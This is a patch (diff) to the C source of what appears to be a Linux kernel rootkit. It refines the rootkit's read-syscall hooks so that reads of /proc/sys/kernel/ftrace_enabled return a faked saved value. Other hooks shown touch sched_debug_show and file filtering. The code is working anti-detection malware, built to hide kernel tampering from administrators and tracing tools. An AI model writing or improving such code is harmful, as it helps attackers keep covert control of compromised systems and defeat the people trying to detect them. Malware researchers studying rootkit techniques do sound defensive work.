@@ -30,6 +30,53 @@ static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
 static asmlinkage ssize_t (*orig_readv_ia32)(const struct pt_regs *regs);
 static int (*orig_sched_debug_show)(struct seq_file *m, void *v);
 
+static notrace bool is_real_ftrace_enabled(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry;
+    struct super_block *sb;
+    struct dentry *parent;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "ftrace_enabled") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    if (strcmp(sb->s_type->name, "proc") != 0 && 
+        strcmp(sb->s_type->name, "sysfs") != 0)
+        return false;
+    
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    
+    if (strcmp(parent->d_name.name, "kernel") != 0)
+        return false;
+    
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    
+    if (strcmp(parent->d_name.name, "sys") != 0)
+        return false;
+    
+    return true;
+}
+
 notrace static bool should_filter_file(const char *filename) {
     if (!filename)
         return false;
@@ -316,11 +363,7 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     if (ftrace_write_intercepted) {
         struct file *check_file = fget(fd);
         if (check_file) {
-            const char *check_name = NULL;
-            if (check_file->f_path.dentry && check_file->f_path.dentry->d_name.name)
-                check_name = check_file->f_path.dentry->d_name.name;
-            
-            if (check_name && strcmp(check_name, "ftrace_enabled") == 0) {
+            if (is_real_ftrace_enabled(check_file)) {
                 size_t fake_len = strlen(saved_ftrace_value);
                 unsigned long flags;
                 unsigned long now = jiffies;
@@ -407,11 +450,7 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
     if (ftrace_write_intercepted) {
         struct file *check_file = fget(fd);
         if (check_file) {
-            const char *check_name = NULL;
-            if (check_file->f_path.dentry && check_file->f_path.dentry->d_name.name)
-                check_name = check_file->f_path.dentry->d_name.name;
-            
-            if (check_name && strcmp(check_name, "ftrace_enabled") == 0) {
+            if (is_real_ftrace_enabled(check_file)) {
                 size_t fake_len = strlen(saved_ftrace_value);
                 unsigned long flags;
                 unsigned long now = jiffies;
